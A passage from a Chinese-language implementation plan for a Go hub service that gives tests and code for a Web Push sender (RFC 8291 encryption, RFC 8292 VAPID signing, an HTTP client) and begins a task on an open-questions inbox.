	}
	return out, rows.Err()
}

// DeletePushSubscription 删订阅，返回是否真的删了一行。
func (s *Store) DeletePushSubscription(endpoint string) (bool, error) {
	res, err := s.db.Exec("DELETE FROM push_subscriptions WHERE endpoint = ?", endpoint)
	if err != nil {
		return false, err
	}
	n, err := res.RowsAffected()
	return n > 0, err
}

// MarkPushOK 记一次成功：last_ok_at 更新，连续失败归零。
func (s *Store) MarkPushOK(endpoint string) error {
	_, err := s.db.Exec("UPDATE push_subscriptions SET last_ok_at = ?, failures = 0 WHERE endpoint = ?", Now(), endpoint)
	return err
}

// MarkPushFailure 连续失败加一，返回新值（端点不存在时返回 0）。
func (s *Store) MarkPushFailure(endpoint string) (int, error) {
	var n int
	err := s.db.QueryRow("UPDATE push_subscriptions SET failures = failures + 1 WHERE endpoint = ? RETURNING failures", endpoint).Scan(&n)
	if errors.Is(err, sql.ErrNoRows) {
		return 0, nil
	}
	return n, err
}

// CountPushSubscriptions 返回订阅数。
func (s *Store) CountPushSubscriptions() (int, error) {
	var n int
	err := s.db.QueryRow("SELECT COUNT(*) FROM push_subscriptions").Scan(&n)
	return n, err
}
```
（`NewID`、`Now` 是第 3 份 `machines.go`、`store.go` 里已有的函数。）

- [ ] **Step 4: 跑测试确认通过**

Run: `gofmt -l . && go vet ./... && go test ./internal/hub/... -race`
Expected: 全部 PASS。

- [ ] **Step 5: 提交**

```bash
git add internal/hub/store/schema.sql internal/hub/store/store.go internal/hub/store/migrate_test.go internal/hub/store/push.go internal/hub/store/push_test.go
git commit -m "feat(hub/store): 库版本 2，推送订阅表加唯一端点与失败计数，逐版本迁移"
```

---

### Task 3: Web Push 加密（RFC 8291）、VAPID（RFC 8292）与发送客户端

**Files:**
- Create: `internal/hub/push/subscription.go`
- Create: `internal/hub/push/encrypt.go`
- Create: `internal/hub/push/vapid.go`
- Create: `internal/hub/push/client.go`
- Create: `internal/hub/push/encrypt_test.go`
- Create: `internal/hub/push/vapid_test.go`
- Create: `internal/hub/push/client_test.go`

**Interfaces:**（包 `push`，只用标准库）
- `type Subscription struct{ Endpoint string; P256dh []byte; Auth []byte }`；`func ParseSubscription(endpoint, p256dh, auth string) (Subscription, error)`：endpoint 必须是 https URL；p256dh、auth 是浏览器给的 base64url（有无 `=` 补位都收），p256dh 解码后 65 字节且首字节 0x04，auth 16 字节
- `const MaxPlaintext = 3 * 1024`；`var ErrTooLarge = errors.New("推送载荷超过 3 KiB")`
- `func Encrypt(plaintext []byte, sub Subscription) ([]byte, error)`：随机盐与临时密钥；包内 `func encryptWith(plaintext []byte, sub Subscription, asPriv *ecdh.PrivateKey, salt []byte) ([]byte, error)` 供测试用 RFC 向量
- `type VAPID struct{ priv *ecdsa.PrivateKey }`；`func GenerateVAPID() (*VAPID, error)`；`func ParseVAPID(raw []byte) (*VAPID, error)`（raw 是 32 字节私钥标量）；`func (v *VAPID) Raw() []byte`（32 字节）；`func (v *VAPID) PublicKey() []byte`（65 字节未压缩点）；`func (v *VAPID) PublicKeyB64() string`（base64url 无补位，给网页的 `applicationServerKey`）；`func (v *VAPID) Authorization(audience, subject string, now time.Time) (string, error)` → `vapid t=<JWT>, k=<公钥>`，`exp` 为 `now + 12h`，JWT 头固定 `{"typ":"JWT","alg":"ES256"}`，签名为 r‖s 各 32 字节
- `type Client struct{ HTTP *http.Client; VAPID *VAPID; Subject string }`；`type Options struct{ TTL time.Duration; Urgency string; Topic string }`；`func (c *Client) Send(ctx context.Context, sub Subscription, payload []byte, o Options) (int, error)`：返回状态码；2xx 成功；404、410 返回 `ErrGone`；其余非 2xx 返回 `*StatusError{Status int}`；`Topic` 非空时必须是 1 到 32 个 base64url 字符；`Urgency` 空时不发头；`TTL` 零时用 24 小时
- `var ErrGone = errors.New("订阅已失效")`；`type StatusError struct{ Status int }`，`Error()` 为 `推送端点返回 %d`

- [ ] **Step 1: 写失败的测试**

`internal/hub/push/encrypt_test.go`（向量来自 RFC 8291 附录 A 与第 5 节；正文 Content-Length 写 145 是已知勘误，实际 144 字节）:
```go
package push

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdh"
	"crypto/hkdf"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"strings"
	"testing"
)

func b64(t *testing.T, s string) []byte {
	t.Helper()
	b, err := base64.RawURLEncoding.DecodeString(strings.TrimRight(s, "="))
	if err != nil {
		t.Fatalf("base64url %q: %v", s, err)
	}
	return b
}

const (
	rfcPlaintext = "V2hlbiBJIGdyb3cgdXAsIEkgd2FudCB0byBiZSBhIHdhdGVybWVsb24"
	rfcASPrivate = "yfWPiYE-n46HLnH0KqZOF1fJJU3MYrct3AELtAQ-oRw"
	rfcASPublic  = "BP4z9KsN6nGRTbVYI_c7VJSPQTBtkgcy27mlmlMoZIIgDll6e3vCYLocInmYWAmS6TlzAC8wEqKK6PBru3jl7A8"
	rfcUAPrivate = "q1dXpw3UpT5VOmu_cf_v6ih07Aems3njxI-JWgLcM94"
	rfcUAPublic  = "BCVxsr7N_eNgVRqvHtD0zTZsEc6-VV-JvLexhqUzORcxaOzi6-AYWXvTBHm4bjyPjs7Vd8pZGH6SRpkNtoIAiw4"
	rfcAuth      = "BTBZMqHH6r4Tts7J_aSIgg"
	rfcSalt      = "DGv6ra1nlYgDCS1FRnbzlw"
	rfcMessage   = "DGv6ra1nlYgDCS1FRnbzlwAAEABBBP4z9KsN6nGRTbVYI_c7VJSPQTBtkgcy27mlmlMoZIIgDll6e3vCYLocInmYWAmS6TlzAC8wEqKK6PBru3jl7A_yl95bQpu6cVPTpK4Mqgkf1CXztLVBSt2Ks3oZwbuwXPXLWyouBWLVWGNWQexSgSxsj_Qulcy4a-fN"
)

func TestEncryptMatchesRFC8291Vector(t *testing.T) {
	asPriv, err := ecdh.P256().NewPrivateKey(b64(t, rfcASPrivate))
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(asPriv.PublicKey().Bytes(), b64(t, rfcASPublic)) {
		t.Fatal("as_public 与私钥不对应，向量抄错了")
	}
	sub := Subscription{Endpoint: "https://push.example.net/p/x", P256dh: b64(t, rfcUAPublic), Auth: b64(t, rfcAuth)}
	got, err := encryptWith(b64(t, rfcPlaintext), sub, asPriv, b64(t, rfcSalt))
	if err != nil {
		t.Fatal(err)
	}
	want := b64(t, rfcMessage)
	if len(want) != 144 {
		t.Fatalf("向量长度 %d，应为 144", len(want))
	}
	if !bytes.Equal(got, want) {
		t.Fatalf("密文与 RFC 8291 向量不符\n 得到 %s\n 想要 %s", base64.RawURLEncoding.EncodeToString(got), rfcMessage)
	}
	// 头部布局：盐 16、rs 4（4096）、idlen 1（65）、公钥 65
	if binary.BigEndian.Uint32(got[16:20]) != 4096 || got[20] != 65 || !bytes.Equal(got[21:86], b64(t, rfcASPublic)) {
		t.Fatal("aes128gcm 头部布局不对")
	}
}

// decrypt 是只在测试里用的接收端实现：按 RFC 8291 用浏览器侧私钥解开，验证随机盐与临时密钥的路径。
func decrypt(t *testing.T, body []byte, uaPriv *ecdh.PrivateKey, auth []byte) []byte {
	t.Helper()
	salt, idlen := body[:16], int(body[20])
	asPub, err := ecdh.P256().NewPublicKey(body[21 : 21+idlen])
	if err != nil {
		t.Fatal(err)
	}
	shared, err := uaPriv.ECDH(asPub)
	if err != nil {
		t.Fatal(err)
	}
	prkKey, _ := hkdf.Extract(sha256.New, shared, auth)
	ikm, _ := hkdf.Expand(sha256.New, prkKey, "WebPush: info\x00"+string(uaPriv.PublicKey().Bytes())+string(asPub.Bytes()), 32)
	prk, _ := hkdf.Extract(sha256.New, ikm, salt)
	cek, _ := hkdf.Expand(sha256.New, prk, "Content-Encoding: aes128gcm\x00", 16)
	nonce, _ := hkdf.Expand(sha256.New, prk, "Content-Encoding: nonce\x00", 12)
	block, _ := aes.NewCipher(cek)
	gcm, _ := cipher.NewGCM(block)
	padded, err := gcm.Open(nil, nonce, body[21+idlen:], nil)
	if err != nil {
		t.Fatalf("解密失败: %v", err)
	}
	i := bytes.LastIndexByte(padded, 0x02)
	if i < 0 {
		t.Fatal("没有填充分隔符")
	}
	return padded[:i]
}

func TestEncryptRoundTripRandom(t *testing.T) {
	uaPriv, _ := ecdh.P256().GenerateKey(rand.Reader)
	auth := b64(t, rfcAuth)
	sub := Subscription{Endpoint: "https://push.example.net/p/x", P256dh: uaPriv.PublicKey().Bytes(), Auth: auth}
	msg := []byte(`{"id":"r1","title":"Mac · blog","body":"git push origin main"}`)
	body, err := Encrypt(msg, sub)
	if err != nil {
		t.Fatal(err)
	}
	if got := decrypt(t, body, uaPriv, auth); !bytes.Equal(got, msg) {
		t.Fatalf("往返不一致: %q", got)
	}
	body2, _ := Encrypt(msg, sub)
	if bytes.Equal(body, body2) {
		t.Fatal("两次加密应因随机盐与临时密钥而不同")
	}
	if _, err := Encrypt(make([]byte, MaxPlaintext+1), sub); err != ErrTooLarge {
		t.Fatalf("超长应 ErrTooLarge: %v", err)
	}
}

func TestParseSubscription(t *testing.T) {
	uaPriv, _ := ecdh.P256().GenerateKey(rand.Reader)
	p := base64.RawURLEncoding.EncodeToString(uaPriv.PublicKey().Bytes())
	a := base64.URLEncoding.EncodeToString(b64(t, rfcAuth)) // 带 = 补位也要收
	sub, err := ParseSubscription("https://web.push.apple.com/QAbc", p, a)
	if err != nil || len(sub.P256dh) != 65 || len(sub.Auth) != 16 {
		t.Fatalf("解析: %+v %v", sub, err)
	}
	bad := []struct{ e, p, a string }{
		{"http://web.push.apple.com/QAbc", p, a},
		{"https://web.push.apple.com/QAbc", "AAAA", a},
		{"https://web.push.apple.com/QAbc", p, "AAAA"},
		{"", p, a},
		{"https://web.push.apple.com/QAbc", "not base64!", a},
	}
	for _, c := range bad {
		if _, err := ParseSubscription(c.e, c.p, c.a); err == nil {
			t.Errorf("应拒绝 %+v", c)
		}
	}
}
```
`internal/hub/push/vapid_test.go`:
```go
package push

import (
	"crypto/ecdsa"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"math/big"
	"strings"
	"testing"
	"time"
)

func TestVAPIDKeyRoundTrip(t *testing.T) {
	v, err := GenerateVAPID()
	if err != nil {
		t.Fatal(err)
	}
	raw := v.Raw()
	if len(raw) != 32 {
		t.Fatalf("私钥 %d 字节", len(raw))
	}
	v2, err := ParseVAPID(raw)
	if err != nil || v2.PublicKeyB64() != v.PublicKeyB64() {
		t.Fatalf("解析回来的公钥不同: %v", err)
	}
	pub := v.PublicKey()
	if len(pub) != 65 || pub[0] != 4 || strings.ContainsAny(v.PublicKeyB64(), "+/=") {
		t.Fatalf("公钥形状: %d %x %s", len(pub), pub[0], v.PublicKeyB64())
	}
	if _, err := ParseVAPID(raw[:31]); err == nil {
		t.Fatal("错长私钥应报错")
	}
}

func TestVAPIDAuthorization(t *testing.T) {
	v, _ := GenerateVAPID()
	now := time.Unix(1_800_000_000, 0)
	hdr, err := v.Authorization("https://web.push.apple.com", "https://hub.example.com", now)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(hdr, "vapid t=") || !strings.Contains(hdr, ", k="+v.PublicKeyB64()) {
		t.Fatalf("头格式: %s", hdr)
	}
	jwt := strings.TrimPrefix(strings.SplitN(hdr, ",", 2)[0], "vapid t=")
	parts := strings.Split(jwt, ".")
	if len(parts) != 3 || parts[0] != "eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiJ9" {
		t.Fatalf("JWT 头: %v", parts)
	}
	claimsB, _ := base64.RawURLEncoding.DecodeString(parts[1])
	var claims struct {
		Aud string `json:"aud"`
		Exp int64  `json:"exp"`
		Sub string `json:"sub"`
	}
	if err := json.Unmarshal(claimsB, &claims); err != nil || claims.Aud != "https://web.push.apple.com" || claims.Sub != "https://hub.example.com" || claims.Exp != now.Add(12*time.Hour).Unix() {
		t.Fatalf("claims: %s %v", claimsB, err)
	}
	sig, _ := base64.RawURLEncoding.DecodeString(parts[2])
	if len(sig) != 64 {
		t.Fatalf("签名应为 r‖s 64 字节，得到 %d", len(sig))
	}
	h := sha256.Sum256([]byte(parts[0] + "." + parts[1]))
	if !ecdsa.Verify(&v.priv.PublicKey, h[:], new(big.Int).SetBytes(sig[:32]), new(big.Int).SetBytes(sig[32:])) {
		t.Fatal("签名校验失败")
	}
	// RFC 8292 图 2 的 claims 串形：字段顺序 aud、exp、sub
	if !strings.HasPrefix(string(claimsB), `{"aud":"`) || !strings.Contains(string(claimsB), `","exp":`) || !strings.HasSuffix(string(claimsB), `"}`) {
		t.Fatalf("claims 顺序: %s", claimsB)
	}
	if _, err := v.Authorization("push.example.net", "https://hub.example.com", now); err == nil {
		t.Fatal("audience 不是 origin 应报错")
	}
}
```

`internal/hub/push/client_test.go`:
```go
package push

import (
	"context"
	"crypto/ecdh"
	"crypto/rand"
	"errors"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync/atomic"
	"testing"
	"time"
)

func TestClientSend(t *testing.T) {
	var status atomic.Int32
	status.Store(201)
	var got http.Header
	var bodyLen int
	srv := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		got = r.Header.Clone()
		b, _ := io.ReadAll(r.Body)
		bodyLen = len(b)
		w.WriteHeader(int(status.Load()))
	}))
	defer srv.Close()
	v, _ := GenerateVAPID()
	c := &Client{HTTP: srv.Client(), VAPID: v, Subject: "https://hub.example.com"}
	uaPriv, _ := ecdh.P256().GenerateKey(rand.Reader)
	sub := Subscription{Endpoint: srv.URL + "/p/abc", P256dh: uaPriv.PublicKey().Bytes(), Auth: make([]byte, 16)}
	payload := []byte(`{"id":"r1"}`)
	code, err := c.Send(context.Background(), sub, payload, Options{TTL: time.Hour, Urgency: "high", Topic: "r1"})
	if err != nil || code != 201 {
		t.Fatalf("send: %d %v", code, err)
	}
	if got.Get("Content-Encoding") != "aes128gcm" || got.Get("TTL") != "3600" || got.Get("Urgency") != "high" || got.Get("Topic") != "r1" ||
		got.Get("Content-Type") != "application/octet-stream" || !strings.HasPrefix(got.Get("Authorization"), "vapid t=") {
		t.Fatalf("头: %v", got)
	}
	if bodyLen != 86+len(payload)+1+16 {
		t.Fatalf("body %d 字节", bodyLen)
	}
	// 默认 TTL 24 小时，不发 Urgency、Topic
	c.Send(context.Background(), sub, payload, Options{})
	if got.Get("TTL") != "86400" || got.Get("Urgency") != "" || got.Get("Topic") != "" {
		t.Fatalf("默认头: %v", got)
	}
	status.Store(410)
	if code, err := c.Send(context.Background(), sub, payload, Options{}); !errors.Is(err, ErrGone) || code != 410 {
		t.Fatalf("410: %d %v", code, err)
	}
	status.Store(404)
	if _, err := c.Send(context.Background(), sub, payload, Options{}); !errors.Is(err, ErrGone) {
		t.Fatalf("404: %v", err)
	}
	status.Store(500)
	var se *StatusError
	if code, err := c.Send(context.Background(), sub, payload, Options{}); !errors.As(err, &se) || se.Status != 500 || code != 500 {
		t.Fatalf("500: %d %v", code, err)
	}
	if _, err := c.Send(context.Background(), sub, payload, Options{Topic: "not base64url!"}); err == nil {
		t.Fatal("坏 Topic 应报错")
	}
	if _, err := c.Send(context.Background(), sub, make([]byte, MaxPlaintext+1), Options{}); !errors.Is(err, ErrTooLarge) {
		t.Fatal("超长应 ErrTooLarge")
	}
}
```

- [ ] **Step 2: 跑测试确认失败**

Run: `go test ./internal/hub/push/`
Expected: FAIL，包不存在或 `encryptWith` 未定义。

- [ ] **Step 3: 写实现**

`internal/hub/push/subscription.go`:
```go
// Package push 实现 Web Push 的发送端：RFC 8291 的 aes128gcm 加密与 RFC 8292 的 VAPID 签名，只用标准库。
package push

import (
	"encoding/base64"
	"errors"
	"fmt"
	"net/url"
	"strings"
)

// Subscription 是浏览器给的一条推送订阅：端点、浏览器侧 P-256 公钥（65 字节未压缩点）与 16 字节认证密钥。
type Subscription struct {
	Endpoint string
	P256dh   []byte
	Auth     []byte
}

// decodeB64 解 base64url，有无 = 补位都收。
func decodeB64(s string) ([]byte, error) {
	return base64.RawURLEncoding.DecodeString(strings.TrimRight(s, "="))
}

// ParseSubscription 校验并解码浏览器 PushSubscription.toJSON() 里的 endpoint 与 keys。
func ParseSubscription(endpoint, p256dh, auth string) (Subscription, error) {
	u, err := url.Parse(endpoint)
	if err != nil || u.Scheme != "https" || u.Host == "" {
		return Subscription{}, errors.New("推送端点必须是 https 地址")
	}
	p, err := decodeB64(p256dh)
	if err != nil || len(p) != 65 || p[0] != 4 {
		return Subscription{}, fmt.Errorf("p256dh 不是 65 字节的未压缩 P-256 公钥")
	}
	a, err := decodeB64(auth)
	if err != nil || len(a) != 16 {
		return Subscription{}, fmt.Errorf("auth 不是 16 字节")
	}
	return Subscription{Endpoint: endpoint, P256dh: p, Auth: a}, nil
}
```

`internal/hub/push/encrypt.go`:
```go
package push

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdh"
	"crypto/hkdf"
	"crypto/rand"
	"crypto/sha256"
	"encoding/binary"
	"errors"
	"fmt"
)

// MaxPlaintext 是推送载荷上限：Apple 与各推送服务收 4 KiB 的 body，这里给加密头与填充留余量。
const MaxPlaintext = 3 * 1024

// ErrTooLarge 表示载荷超过 MaxPlaintext。
var ErrTooLarge = errors.New("推送载荷超过 3 KiB")

// recordSize 是 aes128gcm 的记录大小，单记录消息，必须大于 明文 + 1 字节分隔符 + 16 字节标签。
const recordSize = 4096

// Encrypt 按 RFC 8291 加密：每条消息新的随机盐与临时 ECDH 密钥。
func Encrypt(plaintext []byte, sub Subscription) ([]byte, error) {
	asPriv, err := ecdh.P256().GenerateKey(rand.Reader)
	if err != nil {
		return nil, err
	}
	salt := make([]byte, 16)
	if _, err := rand.Read(salt); err != nil {
		return nil, err
	}
	return encryptWith(plaintext, sub, asPriv, salt)
}

// encryptWith 是 Encrypt 的确定性核心，测试用 RFC 8291 附录 A 的密钥与盐核对输出。
func encryptWith(plaintext []byte, sub Subscription, asPriv *ecdh.PrivateKey, salt []byte) ([]byte, error) {
	if len(plaintext) > MaxPlaintext {
		return nil, ErrTooLarge
	}
	if len(salt) != 16 {
		return nil, fmt.Errorf("盐应为 16 字节")
	}
	uaPub, err := ecdh.P256().NewPublicKey(sub.P256dh)
	if err != nil {
		return nil, fmt.Errorf("订阅公钥: %w", err)
	}
	shared, err := asPriv.ECDH(uaPub)
	if err != nil {
		return nil, err
	}
	asPub := asPriv.PublicKey().Bytes()
	// RFC 8291 3.3、3.4：IKM = HKDF(auth, ecdh_secret, "WebPush: info" || 0 || ua_public || as_public, 32)
	prkKey, err := hkdf.Extract(sha256.New, shared, sub.Auth)
	if err != nil {
		return nil, err
	}
	ikm, err := hkdf.Expand(sha256.New, prkKey, "WebPush: info\x00"+string(sub.P256dh)+string(asPub), 32)
	if err != nil {
		return nil, err
	}
	// RFC 8188 2.2：CEK 与 NONCE 从 PRK = HKDF-Extract(salt, IKM) 派生
	prk, err := hkdf.Extract(sha256.New, ikm, salt)
	if err != nil {
		return nil, err
	}
	cek, err := hkdf.Expand(sha256.New, prk, "Content-Encoding: aes128gcm\x00", 16)
	if err != nil {
		return nil, err
	}
	nonce, err := hkdf.Expand(sha256.New, prk, "Content-Encoding: nonce\x00", 12)
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(cek)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	padded := make([]byte, 0, len(plaintext)+1)
	padded = append(padded, plaintext...)
	padded = append(padded, 0x02) // 最后一条记录的分隔符
	// 头：salt(16) || rs(4) || idlen(1) || keyid(65)
	out := make([]byte, 0, 86+len(padded)+gcm.Overhead())
	out = append(out, salt...)
	out = binary.BigEndian.AppendUint32(out, recordSize)
	out = append(out, byte(len(asPub)))
	out = append(out, asPub...)
	return gcm.Seal(out, nonce, padded, nil), nil
}
```

`internal/hub/push/vapid.go`:
```go
package push

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"net/url"
	"time"
)

// VAPID 是 hub 的推送签名密钥（RFC 8292），P-256。私钥明文存库，是设计 5.3 的例外。
type VAPID struct {
	priv *ecdsa.PrivateKey
}

// GenerateVAPID 生成新密钥。
func GenerateVAPID() (*VAPID, error) {
	priv, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return nil, err
	}
	return &VAPID{priv: priv}, nil
}

// ParseVAPID 从 32 字节私钥标量恢复密钥。
func ParseVAPID(raw []byte) (*VAPID, error) {
	if len(raw) != 32 {
		return nil, fmt.Errorf("VAPID 私钥应为 32 字节，得到 %d", len(raw))
	}
	priv, err := ecdsa.ParseRawPrivateKey(elliptic.P256(), raw)
	if err != nil {
		return nil, fmt.Errorf("VAPID 私钥: %w", err)
	}
	return &VAPID{priv: priv}, nil
}

// Raw 返回 32 字节私钥标量，存库用。
func (v *VAPID) Raw() []byte { return v.priv.Bytes() }

// PublicKey 返回 65 字节未压缩公钥点。
func (v *VAPID) PublicKey() []byte { return v.priv.PublicKey.Bytes() }

// PublicKeyB64 是给网页 applicationServerKey 用的 base64url（无补位）。
func (v *VAPID) PublicKeyB64() string { return base64.RawURLEncoding.EncodeToString(v.PublicKey()) }

// jwtHeader 是 RFC 8292 图 2 的头，编码后固定为 eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiJ9。
const jwtHeader = `{"typ":"JWT","alg":"ES256"}`

type vapidClaims struct {
	Aud string `json:"aud"`
	Exp int64  `json:"exp"`
	Sub string `json:"sub"`
}

// Authorization 生成 `vapid t=<JWT>, k=<公钥>`。audience 是推送端点的 origin（scheme://host），subject 是 hub 的联系地址
// （https 源或 mailto:），exp 取 now + 12 小时（RFC 要求不超过 24 小时）。
func (v *VAPID) Authorization(audience, subject string, now time.Time) (string, error) {
	u, err := url.Parse(audience)
	if err != nil || u.Scheme == "" || u.Host == "" || u.Path != "" || u.RawQuery != "" {
		return "", errors.New("audience 必须是 scheme://host 形式的 origin")
	}
	claims, err := json.Marshal(vapidClaims{Aud: audience, Exp: now.Add(12 * time.Hour).Unix(), Sub: subject})
	if err != nil {
		return "", err
	}
	enc := base64.RawURLEncoding
	input := enc.EncodeToString([]byte(jwtHeader)) + "." + enc.EncodeToString(claims)
	h := sha256.Sum256([]byte(input))
	r, s, err := ecdsa.Sign(rand.Reader, v.priv, h[:])
	if err != nil {
		return "", err
	}
	sig := make([]byte, 64)
	r.FillBytes(sig[:32])
	s.FillBytes(sig[32:])
	return "vapid t=" + input + "." + enc.EncodeToString(sig) + ", k=" + v.PublicKeyB64(), nil
}
```
（`ecdsa.ParseRawPrivateKey`、`(*PrivateKey).Bytes`、`(*PublicKey).Bytes` 是 Go 1.25 加的；go.mod 已是 1.26.0。）

`internal/hub/push/client.go`:
```go
package push

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strconv"
	"time"
)

// ErrGone 表示端点回 404 或 410：订阅已失效，应删除。
var ErrGone = errors.New("订阅已失效")

// StatusError 是端点返回的其他非 2xx 状态。
type StatusError struct{ Status int }

func (e *StatusError) Error() string { return fmt.Sprintf("推送端点返回 %d", e.Status) }

// Client 向推送服务发消息。
type Client struct {
	HTTP    *http.Client
	VAPID   *VAPID
	Subject string // VAPID 的 sub：hub 的 https 源或 mailto:
}

// Options 是一条推送的投递参数。
type Options struct {
	TTL     time.Duration // 零为 24 小时
	Urgency string        // very-low、low、normal、high；空不发
	Topic   string        // 1 到 32 个 base64url 字符；同 topic 的未投递消息被替换；空不发
}

var topicRe = regexp.MustCompile(`^[A-Za-z0-9_-]{1,32}$`)

// Send 加密并发送。返回状态码；2xx 成功，404、410 返回 ErrGone，其余非 2xx 返回 *StatusError。
func (c *Client) Send(ctx context.Context, sub Subscription, payload []byte, o Options) (int, error) {
	if o.Topic != "" && !topicRe.MatchString(o.Topic) {
		return 0, errors.New("Topic 须是 1 到 32 个 base64url 字符")
	}
	body, err := Encrypt(payload, sub)
	if err != nil {
		return 0, err
	}
	u, err := url.Parse(sub.Endpoint)
	if err != nil {
		return 0, err
	}
	auth, err := c.VAPID.Authorization(u.Scheme+"://"+u.Host, c.Subject, time.Now())
	if err != nil {
		return 0, err
	}
	ttl := o.TTL
	if ttl == 0 {
		ttl = 24 * time.Hour
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, sub.Endpoint, bytes.NewReader(body))
	if err != nil {
		return 0, err
	}
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("Content-Encoding", "aes128gcm")
	req.Header.Set("TTL", strconv.Itoa(int(ttl/time.Second)))
	req.Header.Set("Authorization", auth)
	if o.Urgency != "" {
		req.Header.Set("Urgency", o.Urgency)
	}
	if o.Topic != "" {
		req.Header.Set("Topic", o.Topic)
	}
	hc := c.HTTP
	if hc == nil {
		hc = &http.Client{Timeout: 10 * time.Second}
	}
	resp, err := hc.Do(req)
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, io.LimitReader(resp.Body, 4096))
	switch {
	case resp.StatusCode >= 200 && resp.StatusCode < 300:
		return resp.StatusCode, nil
	case resp.StatusCode == http.StatusNotFound || resp.StatusCode == http.StatusGone:
		return resp.StatusCode, ErrGone
	default:
		return resp.StatusCode, &StatusError{Status: resp.StatusCode}
	}
}
```

- [ ] **Step 4: 跑测试确认通过**

Run: `gofmt -l . && go vet ./internal/hub/push/ && go test ./internal/hub/push/ -race -v`
Expected: 全部 PASS，`TestEncryptMatchesRFC8291Vector` 过说明加密与 RFC 向量逐字节一致。

- [ ] **Step 5: 提交**

```bash
git add internal/hub/push/
git commit -m "feat(hub/push): Web Push 发送端：RFC 8291 aes128gcm 加密、RFC 8292 VAPID 签名与客户端（标准库实现，RFC 向量验证）"
```

---

### Task 4: hub：收件箱带“等你回答”，“记住”草案预览与范围选择

**Files:**
- Modify: `internal/hub/store/requests.go`（`OpenQuestions`）
- Modify: `internal/hub/store/requests_test.go`
- Modify: `internal/hub/rules.go`（`draftRule`；`learnRule` 带 scope）
- Modify: `internal/hub/requests.go`（`DecideInput.Scope`）
- Modify: `internal/hub/api.go`（`/api/inbox` 形状；`POST /api/requests/{id}/propose`；decide 的 `scope`）
- Modify: `internal/hub/api_test.go`
- Modify: `docs/hub.md`

**Interfaces:**
- `func (s *Store) OpenQuestions(since time.Time, limit int) ([]Request, error)`：`kind = question`、`state = recorded`、`created_at >= since`，且同一 `session_id` 没有更晚的行（done、session_end、新的 permission 或 question 都算“已经不等了”）；`session_id` 为空的 question 视为仍在等；按 created_at 倒序
- `GET /api/inbox` → `{"pending":[请求视图…],"questions":[请求视图…]}`；questions 取最近 24 小时、至多 100 条
- `POST /api/requests/{id}/propose`，cookie + 同源，body `{"action":"allow|deny","scope":"project|global"}`（scope 缺省 project）→ 200 `{"rule_id":"…","scope":"project|global","yaml":"…","summary":{"action":"allow|deny","payload":"shell|file_write|network|mcp","anchor":"…"}}`；只计算不入库。错误：坏 action 或 scope 400；没有 404；不是 pending 409；不能记住 422（文案与 decide 一致，以“不能记住：”开头）；`scope = project` 但请求没有项目根 422“不能记住：没有项目根，只能记成全局”
- `POST /api/requests/{id}/decide` 的 body 加 `"scope":"project|global"`（只在 `remember: true` 时有意义，缺省 project）；`DecideInput` 加 `Scope string`
- 包内：`func (s *Server) draftRule(r store.Request, action, scope string) (policy.Rule, error)`（原 `learnRule` 里“取请求 → 校验 → ProposeRule 或 denyRule”的部分，再按 scope 改写 `rule.Scope`，最后 `policy.RuleSet{Version: 1, Rules: []policy.Rule{rule}}.Validate()`；deny 的引擎自检保留在范围改写之后）；`learnRule(r, action, scope)` 调 `draftRule` 后做“读规则集 → 试编 → 入库”；`func ruleAnchor(r policy.Rule) string`（`command_prefix`、`command_regex`、`path_glob`、`mcp_server/mcp_tool`、`domain` 里非空的那个）

- [ ] **Step 1: 写失败的测试**

`internal/hub/store/requests_test.go` 追加：
```go
func TestOpenQuestions(t *testing.T) {
	s := openTestStore(t)
	m, _ := s.CreateMachine("mac", "secret-1", "/home/u")
	sess := func(cli string) string {
		id, err := s.UpsertSession(m.ID, proto.Session{Tool: "claude", CLISessionID: cli, Cwd: "/p"}, "p")
		if err != nil {
			t.Fatal(err)
		}
		return id
	}
	s1, s2 := sess("s1"), sess("s2")
	at := func(sec int) string { return FormatTime(time.Date(2026, 10, 23, 10, 0, sec, 0, time.UTC)) }
	mk := func(id, session, kind, state, created string) {
		t.Helper()
		if err := s.InsertRequest(Request{ID: id, MachineID: m.ID, SessionID: session, Kind: kind, State: state, Payload: policy.Payload{Type: policy.PayloadOther}, CreatedAt: created}); err != nil {
			t.Fatal(err)
		}
	}
	mk("q1", s1, "question", "recorded", at(1)) // 之后有 done：不再等
	mk("d1", s1, "done", "recorded", at(2))
	mk("q2", s2, "question", "recorded", at(3)) // 仍在等
	mk("q3", "", "question", "recorded", at(4)) // 没有会话：仍在等
	mk("q4", s2, "question", "recorded", at(0)) // 太旧
	got, err := s.OpenQuestions(time.Date(2026, 10, 23, 10, 0, 1, 0, time.UTC), 10)
	if err != nil {
		t.Fatal(err)
	}
	var ids []string
	for _, r := range got {
		ids = append(ids, r.ID)
	}
	if strings.Join(ids, ",") != "q3,q2" {
		t.Fatalf("OpenQuestions = %v", ids)
	}
	mk("p1", s2, "permission", "pending", at(5)) // 同会话来了新的审批：q2 不再等
	got, _ = s.OpenQuestions(time.Date(2026, 10, 23, 10, 0, 1, 0, time.UTC), 10)
	if len(got) != 1 || got[0].ID != "q3" {
		t.Fatalf("有新 permission 后 = %+v", got)
	}
}
```
